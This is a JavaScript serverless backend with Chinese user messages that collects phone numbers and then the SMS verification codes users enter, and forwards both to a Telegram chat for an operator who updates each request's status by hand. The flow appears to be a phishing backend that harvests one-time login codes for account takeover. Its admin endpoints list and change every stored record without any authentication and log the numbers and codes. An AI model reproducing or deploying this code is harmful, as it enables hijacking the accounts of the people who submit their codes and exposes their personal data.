import { TG_BOT_TOKEN, TG_CHAT_ID } from './config.js';

export async function verifyPhone(request, { env }) {
    // 使用 env.PHONE_KV 替代 PHONE_KV
    const { phone } = await request.json();
    
    if (!phone || !/^\+?[1-9]\d{1,14}$/.test(phone)) {
        return new Response(JSON.stringify({ message: '无效的手机号格式' }), { status: 400 });
    }

    if (phone.startsWith('+86') && !/^\+86[1][3-9]\d{9}$/.test(phone)) {
        return new Response(JSON.stringify({ message: '无效的中国手机号格式' }), { status: 400 });
    }

    const kvData = await env.PHONE_KV.get(phone);
    if (kvData) {
        const data = JSON.parse(kvData);
        if (data.status === 4) {
            return new Response(JSON.stringify({ message: '该手机号无效,请尝试使用其他手机号' }), { status: 400 });
        }
    }

    return new Response(JSON.stringify({ message: '验证通过' }), { status: 200 });
}

export async function checkStatus(request, { env }) {
    const url = new URL(request.url);
    const phone = url.searchParams.get('phone');

    const kvData = await env.PHONE_KV.get(phone);
    if (!kvData) {
        return new Response(JSON.stringify({ status: 0 }), { status: 200 });
    }

    const data = JSON.parse(kvData);
    return new Response(JSON.stringify(data), { status: 200 });
}

export async function register(request, { env }) {
    const { phone } = await request.json();

    await env.PHONE_KV.put(phone, JSON.stringify({ status: 1, phone: { number: phone } }));

    await sendTelegramNotification(`手机号：${phone}申请注册,请处理。`, env);

    return new Response(JSON.stringify({ message: '注册申请已提交' }), { status: 200 });
}

export async function submitCode(request, { env }) {
    const { phone, code } = await request.json();

    await env.PHONE_KV.put(phone, JSON.stringify({ status: 2, phone: { number: phone, code } }));

    await sendTelegramNotification(`正在注册,手机号：${phone},验证码：${code}`, env);

    return new Response(JSON.stringify({ message: '验证码已提交' }), { status: 200 });
}

export async function getAdminRecords(request, { env }) {
    console.log('getAdminRecords function called');
    const records = [];
    console.log('Starting to fetch admin records');
    try {
        console.log('PHONE_KV:', env.PHONE_KV);
        const { keys } = await env.PHONE_KV.list();
        console.log('KV keys:', keys);

        for (const key of keys) {
            const value = await env.PHONE_KV.get(key);
            console.log(`Value for key ${key}:`, value);
            if (value) {
                try {
                    const data = JSON.parse(value);
                    if (data && data.phone) {
                        records.push(data);
                    } else {
                        console.error('Invalid record format:', data);
                    }
                } catch (error) {
                    console.error('Error parsing record:', error);
                }
            }
        }
    } catch (error) {
        console.error('Error fetching records:', error);
    }

    console.log('Final records:', records);
    return new Response(JSON.stringify(records), { 
        status: 200,
        headers: { 'Content-Type': 'application/json' }
    });
}

export async function updateAdminStatus(request, { env }) {
    const { phone, status } = await request.json();

    const kvData = await env.PHONE_KV.get(phone);
    if (kvData) {
        const data = JSON.parse(kvData);
        data.status = status;
        await env.PHONE_KV.put(phone, JSON.stringify(data));
        return new Response(JSON.stringify({ message: '状态更新成功' }), { status: 200 });
    }

    return new Response(JSON.stringify({ message: '未找到该手机号记录' }), { status: 404 });
}

async function sendTelegramNotification(message, env) {
    const url = `https://api.telegram.org/bot${env.TG_BOT_TOKEN}/sendMessage`;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: env.TG_CHAT_ID,
                text: message,
            }),
        });

        if (!response.ok) {
            console.error('Failed to send Telegram notification', await response.text());
        }
    } catch (error) {
        console.error('Error sending Telegram notification:', error);
    }
}

export async function testKV(request, { env }) {
    try {
        await env.PHONE_KV.put('test_key', JSON.stringify({ test: 'value' }));
        const value = await env.PHONE_KV.get('test_key');
        return new Response(JSON.stringify({ test: value }), { 
            status: 200,
            headers: { 'Content-Type': 'application/json' }
        });
    } catch (error) {
        return new Response(JSON.stringify({ error: error.message }), { 
            status: 500,
            headers: { 'Content-Type': 'application/json' }
        });
    }
}